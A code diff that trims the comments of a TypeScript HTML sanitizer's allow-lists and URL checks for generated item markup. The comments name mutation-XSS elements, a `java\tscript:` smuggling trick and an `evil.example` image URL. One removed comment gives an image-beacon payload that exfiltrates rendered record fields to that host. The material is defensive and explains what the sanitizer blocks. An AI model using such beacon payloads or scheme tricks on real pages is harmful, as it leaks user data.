@@ -1,20 +1,15 @@
-// The closed allow-list the runtime enforcer keys on — the *data* half of the
-// closed-value design contract. It mirrors the
-// vocabulary whose single source of truth is
-// design/design-system.md (classes) and design/styles/layout-kit.css (their CSS). The
-// enforcer (enforcer.ts) and the design-lint gate rung (3.6) both key on these sets;
-// vocabulary.test.ts cross-checks ALLOWED_CLASSES against the layout kit so the two
-// can never silently drift.
+// The closed allow-list the runtime enforcer keys on — the data half of the closed-value design
+// contract. It mirrors the vocabulary whose single source of truth is design/design-system.md
+// (classes) and design/styles/layout-kit.css (their CSS). The enforcer and the design-lint gate
+// rung both key on these sets, and vocabulary.test.ts cross-checks `ALLOWED_CLASSES` against the
+// layout kit so the two cannot silently drift.
 //
-// *Closed values, open composition.* The closed thing is the design-value space (the
-// classes/tokens) and the executable surface (which elements/attributes may appear),
-// never how an item arranges one record's own fields.
+// Closed values, open composition: the closed thing is the design-value space and the executable
+// surface, never how an item arranges one record's own fields.
 
 /**
- * The closed set of semantic/primitive classes generated item markup may use. Any
- * `class` token outside this set is fabricated and gets dropped. Kept in the exact
- * lowercase form the CSS authored — class names are case-sensitive, so a mismatched
- * casing would not resolve against the layout kit anyway.
+ * The closed set of semantic/primitive classes generated item markup may use; any other `class`
+ * token is dropped. Class names are case-sensitive, so these are the CSS's exact lowercase form.
  */
 export const ALLOWED_CLASSES: ReadonlySet<string> = new Set([
   // Intra-item composition
@@ -63,18 +58,8 @@ export const ALLOWED_CLASSES: ReadonlySet<string> = new Set([
 ]);
 
 /**
- * Presentational, non-interactive, same-namespace elements generated item markup may
- * use. An allowed element is kept and its attributes are cleaned; anything not here is
- * either removed with its content (REMOVED_ELEMENTS) or unwrapped (everything else —
- * interactive controls, `<html>`/`<body>` framing, and unknown/custom elements — so
- * their inner record text survives while the tag and its handlers do not).
- *
- * `<hr>` is absent, and it is the one absence the style rules cannot explain. Every
- * other boundary a record could draw is a CSS declaration, and `border` is never
- * declared — but a bare `<hr>` needs no declaration at all: the user agent draws it as
- * an inset 1px rule, so a property-keyed ban cannot see it. It is a boundary, the ink
- * system owns every boundary, and unwrapping it leaves nothing behind, since it has no
- * content. A record separates with a fill, a size or a gap instead.
+ * Presentational, non-interactive, same-namespace elements item markup may use. `<hr>` is absent
+ * because a user agent draws it with no declaration, where a property-keyed ban cannot see it.
  */
 export const ALLOWED_ELEMENTS: ReadonlySet<string> = new Set([
   // Flow containers + blocks
@@ -156,10 +141,8 @@ export const ALLOWED_ELEMENTS: ReadonlySet<string> = new Set([
 ]);
 
 /**
- * Elements dropped *with their content* — their content is code, raw non-HTML text, or
- * a foreign/embedding context, never record data worth keeping. Scripts and styles are
- * the executable-surface bans; `<svg>`/`<math>`/`<template>`/raw-text elements are the
- * classic mutation-XSS vectors, so they leave with everything inside them.
+ * Elements dropped with their content: code, raw non-HTML text, or a foreign/embedding context.
+ * `<svg>`/`<math>`/`<template>`/raw-text elements are the classic mutation-XSS vectors.
  */
 export const REMOVED_ELEMENTS: ReadonlySet<string> = new Set([
   "script",
@@ -192,14 +175,8 @@ export const REMOVED_ELEMENTS: ReadonlySet<string> = new Set([
 ]);
 
 /**
- * Attributes safe on any allowed element (plus most `aria-*`, handled in `isSafeAttr`).
- *
- * `role` is absent, and it is the one absence worth explaining. A record *is* a
- * `<button>` — the platform's item wrapper — and opening it is the only thing it does, so
- * the semantics of the whole item are the platform's and there is nothing left inside for a
- * record to declare a role for. What a `role` could do is make the item lie: `role="button"`
- * nests an ARIA button inside the real one, and `role="link"` announces a destination that
- * does not exist.
+ * Attributes safe on any allowed element (plus most `aria-*`, handled in `isSafeAttr`). `role` is
+ * absent because it makes the item lie: `role="link"` announces a destination that does not exist.
  */
 const GLOBAL_SAFE_ATTRS: ReadonlySet<string> = new Set([
   "title",
@@ -210,26 +187,20 @@ const GLOBAL_SAFE_ATTRS: ReadonlySet<string> = new Set([
 ]);
 
 /**
- * The one `aria-*` attribute a record may not carry. Every other one describes the content
- * to a reader; this one takes it away — a record could hide its own text from assistive
- * technology while showing it on screen, which is the one thing the item wrapper's
- * accessible name cannot make up for.
+ * The one `aria-*` attribute a record may not carry. Every other describes the content to a
+ * reader; this one takes it away, hiding a record's text while it still shows on screen.
  */
 const REMOVED_ARIA_ATTRS: ReadonlySet<string> = new Set(["aria-hidden"]);
 
 /**
- * Per-element attribute allow-list. Everything not listed here (and not global/`aria-*`,
- * `class`, or `style`) is dropped by default-deny — which is what neutralizes every
- * `on*=` handler, `href`, `srcdoc`, `id`/`name` (DOM-clobbering), `data-*`, `is=`, and
- * so on without having to enumerate them.
+ * Per-element attribute allow-list. Everything unlisted (and not global/`aria-*`, `class` or
+ * `style`) is dropped by default-deny, which neutralizes `on*=`, `href`, `srcdoc`, `id`, `is=`.
  */
 const ELEMENT_ATTRS: Readonly<Record<string, ReadonlySet<string>>> = {
   img: new Set(["src", "srcset", "sizes", "alt", "width", "height", "loading", "decoding"]),
   source: new Set(["src", "srcset", "sizes", "type", "media", "width", "height"]),
-  // `controls` is the one media attribute the item wrapper cannot honour. A record is a
-  // `<button>` and opening it is the only thing it does, so a transport control inside one
-  // is unreachable — the press lands on the record — and interactive content inside a
-  // button is not valid markup either. A record shows media; it does not play it back.
+  // `controls` is the one media attribute the item wrapper cannot honour: a record is a
+  // `<button>`, so a transport control inside one is unreachable and invalid markup besides.
   video: new Set([
     "src",
     "poster",
@@ -269,32 +240,16 @@ export function isSafeAttr(tag: string, name: string): boolean {
 }
 
 /**
- * Whether a URL-attribute value carries a script-executing or HTML-smuggling scheme.
- * C0 control characters and whitespace are stripped first so `java\tscript:` cannot
- * slip through; inline `data:image/*` stays allowed (legitimate for an image field),
- * while every other `data:` payload and the script schemes are rejected.
- *
- * This is the *scheme* half alone, and it is what the Handler-fragment scrub uses — a
- * Handler composes the capability's own chrome and may legitimately point at an address.
- * Item markup takes the stricter {@link isOffOriginUrl} below.
+ * Whether a URL value carries a script-executing or smuggling scheme; C0 controls are stripped
+ * first, so `java\tscript:` cannot pass. Item markup takes the stricter {@link isOffOriginUrl}.
  */
 export function isDangerousUrl(value: string): boolean {
   return urlCandidates(value).some(isDangerousUrlCandidate);
 }
 
 /**
- * Whether a URL-attribute value in *item markup* is off-limits: a dangerous scheme, or any
- * address that would make the browser fetch from somewhere else.
- *
- * A record may not reach off this origin. The `url(...)` ban in `style-discipline.ts` exists
- * for exactly this reason — it loads a remote resource — and leaving `<img src>` open made
- * that ban half a rule: a renderer emitting
- * `<img src="https://evil.example/px.gif?d=…record fields…" width="1">` passed the
- * design-lint rung clean and survived the enforcer byte-identically, exfiltrating every
- * rendered record. The two surfaces could not both be right.
- *
- * What stays allowed is what a record legitimately holds: an inline `data:image/*`, and a
- * same-origin path. A scheme of any kind and a protocol-relative `//host/…` are refused.
+ * Whether a URL value in item markup is off-limits: everything but an inline `data:image/*`
+ * and a same-origin path. A remote 1×1 `<img src>` exfiltrated every record it rendered.
  */
 export function isOffOriginUrl(value: string): boolean {
   return urlCandidates(value).some(
@@ -303,9 +258,8 @@ export function isOffOriginUrl(value: string): boolean {
 }
 
 /**
- * The addresses one attribute value names. `srcset` carries a comma-separated candidate
- * list with density/width descriptors, so a check that read the whole value as one URL
- * would see neither of the two addresses in `a.png 1x, https://evil.example/b.png 2x`.
+ * The addresses one attribute value names. `srcset` is a comma-separated candidate list, so
+ * reading it as one URL sees neither address in `a.png 1x, https://evil.example/b.png 2x`.
  */
 function urlCandidates(value: string): string[] {
   const stripped = stripControls(value);
